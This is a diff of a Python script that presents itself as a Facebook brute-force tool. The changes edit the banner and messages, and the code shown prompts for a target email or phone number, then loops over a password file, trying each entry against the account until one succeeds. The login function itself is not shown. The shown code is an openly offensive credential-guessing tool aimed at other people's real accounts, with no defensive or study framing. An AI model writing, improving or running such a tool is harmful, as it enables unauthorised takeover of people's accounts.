@@ -4,8 +4,8 @@ from bs4 import BeautifulSoup
 import sys
 
 if sys.version_info[0] != 3:
-    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
-    fb.py\n\t--------------------------------------''')
+    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3
+    \n\t--------------------------------------''')
     sys.exit()
 
 PASSWORD_FILE = "passwords.txt"
@@ -46,17 +46,17 @@ def is_this_a_password(email, index, password):
 
 
 if __name__ == "__main__":
-    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    print('\n----------|  Welcome To BRRUTEFB  |----------\n')
     if not os.path.isfile(PASSWORD_FILE):
-        print("Password file is not exist: ", PASSWORD_FILE)
+        print("Password file does not exist: ", PASSWORD_FILE)
         sys.exit(0)
     password_data = open(PASSWORD_FILE, 'r').read().split("\n")
-    print("Password file selected: ", PASSWORD_FILE)
-    email = input('Enter Email/Username to target: ').strip()
+    print("Password file: ", PASSWORD_FILE)
+    email = input('Enter Number/Email to target: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
-        print("Trying password [", index, "]: ", password)
+        print("Trying password indexes [", index, "] ")
         if is_this_a_password(email, index, password):
             break
